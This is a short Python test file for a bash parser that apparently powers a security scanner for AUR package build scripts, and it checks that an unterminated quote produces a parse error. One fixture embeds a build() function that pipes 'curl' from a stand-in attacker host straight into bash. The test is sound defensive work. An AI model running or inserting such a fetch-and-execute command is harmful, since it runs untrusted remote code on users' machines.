from __future__ import annotations

from aurmanager.parser.bash_ast import parse_script


def test_strip_array_literals_handles_well_formed_arrays():
    source = "pkgname=foo\nsource=('a' 'b')\nsha256sums=('deadbeef' 'deadbeef')\n"
    parsed = parse_script(source)
    assert parsed.parse_error is None
    assert parsed.arrays["source"] == ["a", "b"]
    assert parsed.arrays["sha256sums"] == ["deadbeef", "deadbeef"]


def test_unterminated_quote_in_array_literal_surfaces_as_parse_error():
    # An unclosed quote must not silently mask the rest of the file to whitespace
    # (which would blind every AST-based rule with no error surfaced) -- it must
    # fail loudly instead.
    source = "source=('a\nbuild() {\n  curl -fsSL https://evil.example.com/x | bash\n}\n"
    parsed = parse_script(source)
    assert parsed.parse_error is not None
    assert "unterminated array literal" in parsed.parse_error
    assert parsed.ast_nodes == []
